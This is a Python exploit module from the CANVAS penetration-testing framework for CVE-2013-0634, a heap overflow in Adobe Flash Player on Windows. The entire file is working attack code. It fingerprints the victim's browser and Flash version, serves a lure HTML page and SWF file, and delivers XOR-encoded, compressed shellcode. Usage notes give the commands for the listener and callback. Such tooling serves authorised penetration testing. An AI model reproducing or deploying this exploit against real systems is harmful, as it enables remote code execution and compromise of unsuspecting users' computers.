#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import zlib

from shellcode import shellcodeGenerator

from Crypto.Cipher import XOR
from httpclientside import httpclientside
from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser

from exploitutils import *
from tcpexploit import *
import canvasengine


NAME                              = 'adobe_flash_regex'
DESCRIPTION                       = 'Adobe Flash Player vulnerability'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = 'Adobe'
DOCUMENTATION['Date public']      = '08/02/2013'
DOCUMENTATION['References']       = ['http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-0634']

DOCUMENTATION['Repeatability']    = 'One-shot'
DOCUMENTATION['VersionsAffected'] = 'Adobe Flash Player for Windows <= 10.3.183.51 and 11.x before 11.5.502.149'
DOCUMENTATION['CVE Name']         = 'CVE-2013-0634'
DOCUMENTATION['CVE Url']          = 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-0634'
DOCUMENTATION['Notes']            = """

This module exploit's a heap based buffer overflow on Adobe Flash Player while handling a regex object.
It bypasses ASLR leaking a vtable pointer.

Specifically, this exploit works on the following versions:

- 11.5.502.146
- 11.5.502.135
- 11.5.502.110
- 11.4.402.287
- 11.4.402.278
- 11.4.402.265

Versions outside of this use an alternate heap manager and therefore this exploit will require
modification to work on those specific versions.

Tested on:
Windows 7 SP1 with IE 8
Windows 7 SP1 Firefox 19.0

Flash 11.4.402.278

Usage:
python ./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:adobe_flash_regexp -O auto_detect_exploits:0
python commandlineInterface.py -v 17 -p5555

"""

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['DELIVERY']              = 'HTTP'

CHANGELOG                         = """
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version         = 0
        self.name            = NAME
        self.filename        = "%s.html" % randomstring(8)
        self.swffilename     = 'Simpsons'
        self.plugin_info     = None # we want clientd to give us a plugin dict
        self.refresh_rate    = 30
        self.xorer           = XOR.new("\x5a")
        self.badstring       = '\x00'

    def is_vulnerable( self, info_dict ):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])

        if not 'Windows' in parsed['os']['family']:
            self.log('Not Windows, not vulnerable to this exploit.')
            return 0

        # Adobe Flash Player before 10.3.183.51 and
        # 11.x before 11.5.502.149 on Windows
        import re

        if "Firefox" in info_dict['plugins']['AGENT'] and "Shockwave Flash" in info_dict['plugins']:
            # we cant check for patch version in ff, fml.
            if "11.4 r402" in info_dict['plugins']['Shockwave Flash'] or "11.5 r502" in info_dict['plugins']['Shockwave Flash']:
                return 1

        if "IE Flash" in info_dict['plugins']:
            flash          = info_dict['plugins']['IE Flash']
            version_regex = "([\d.]*\d+)"
            match         = re.search( version_regex, flash )

            # If there's no match it will throw an exception
            if match:
                flash_version  = match.group(0)
            else:
                return 0

            version_list = flash_version.split(".")
            major = int(version_list[0])
            minor = int(version_list[1])
            build = int(version_list[2])
            patch = int(version_list[3])

            if major == 11:
                if minor == 4:
                    if build == 402:
                        if patch <= 287 and patch >= 265:
                            return 1
                elif minor == 5:
                    if build == 502:
                        if patch <= 146 and patch >= 110:
                            return 1
        return 0

    def makefile(self):
        """
        Makes the exploit HTML
        """
        self.getArgs()

        filedata="""        <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
        <html lang="en">
            <head>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
                <title>Blank Page</title>
            </head>
            <body>
                <object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258" width=600 height=430 VIEWASTEXT>
                    <param name="allowScriptAccess" value="sameDomain" />
                    <param name="allowFullScreen" value="false" />
                    <param name="movie" value="SWFFILENAME.swf" /><param name="quality" value="high" /><param name="bgcolor" value="#ffffff" />
                    <embed src="SWFFILENAME.swf" quality="high" bgcolor="#ffffff" width="550" height="400" name="SWFFILENAME"
                    align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash"
                    pluginspage="http://www.macromedia.com/go/getflashplayer" />
                </object>
            </body>
        </html>"""

        filedata = filedata.replace('SWFFILENAME', self.swffilename)
        filedata = filedata.replace('        ','')
        return filedata

    def makeSWF(self):
        with open(os.path.join(os.path.dirname(__file__), 'Resources', self.swffilename + '.swf'), 'rb') as f:
            return f.read()

    def makesploit(self, clientheader, clientbody):
        self.log("\n---------------\nmakesploit - URL = %s\n---------------\n" % clientheader.URL)

        h = header('SERVER')
        b = body()

        if self.plugin_info:
            info_dict = self.plugin_info

            self.log("We got a plugin info for this target - thanks clientd!")

            if self.is_vulnerable(info_dict):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None
        else:
            # if there is no info about plugins, at least we can filter using
            # the user-agent making sure target is Windows
            useragent = clientheader.getStrValue(['User-Agent'])
            self.log("User-Agent = %s" % useragent)
            if "windows" in useragent.lower():
                self.log("This client is likely to be vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None

        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')

        elif clientheader.URL.count(self.swffilename):
            self.log('Serving SWF file')
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type','application/x-shockwave-flash')

        elif clientheader.URL.count("code"):
            self.createShellcode()
            h.addHeader('Content-Type','application/octet-stream')
            b.setBody(self.xorer.encrypt(zlib.compress(self.shellcode)))

        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        return h, b

    def getArgs(self):
        self.host=self.target.interface
        self.getarg("filename")

    def run(self):
        self.getArgs()

        # Build the html that triggers the vulnerability
        filedata = self.makefile()
        self.log('Opening %s for output' % self.filename)
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote exploit HTML to %s' % self.filename)

        return 1

if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
